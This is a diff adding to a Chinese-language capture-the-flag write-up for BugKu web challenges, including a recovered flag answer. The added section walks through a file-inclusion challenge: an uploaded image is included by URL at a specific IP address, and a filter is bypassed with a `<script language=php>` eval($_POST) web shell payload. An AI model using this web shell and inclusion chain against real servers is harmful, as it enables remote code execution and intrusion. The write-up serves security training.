@@ -110,3 +110,8 @@ print($data);
 ?>
 ```
 得到结果：lag{asdqwdfasfdawfefqwdqwdadwqadawd}，提示里写了Flag:{xxx}，所以把结果改成Flag:{asdqwdfasfdawfefqwdqwdadwqadawd}，结果正确。
+
+1. BugKu Web 33
+提示：文件包含
+
+* 解题思路：既然是文件包含，一开始上来就先试试file=php://input(<?php phpinfo();?>)，提示NAIVE，不管，反正方向是对了，开burp传包才看到这个页面有个隐藏的upload.php，点进去发现是个上传点。结合apache的版本和PHP版本，没啥直接上传shell利用的机会。那就只能上传成jpg的格式，然后用文件包含去利用。http://114.67.246.176:14764/index.php?file=upload/202105140715558770.jpg，打开之后发现提示`_ @eval($_POST['shell']);_`，显然是过滤了<?php?>，换成<script>。`<script language=php>echo 'a'; eval($_POST['pass']);</script>`
